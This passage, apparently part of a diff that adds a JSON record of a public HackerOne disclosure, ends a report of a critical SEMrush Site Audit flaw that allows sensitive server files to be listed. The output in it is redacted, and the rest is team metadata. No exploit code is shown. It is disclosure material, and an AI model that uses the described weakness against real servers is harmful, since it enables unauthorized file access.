found\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n\n<p>This issue could be abused to identify and list the contents of sensitive files on the Semrush server which implements the Site Audit functionality.</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.semrush.com/", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "SEMrush"
+        }, 
+        "handle": "semrush", 
+        "url": "https://hackerone.com/semrush", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/015/966/de40911e781a8b85c3b253fa22f0119175ca91f2_small.png?1477497046", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/015/966/9b01ecc388e5d9d64b3b532dd5db41b02323e9dc_medium.png?1477497046"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 15966, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
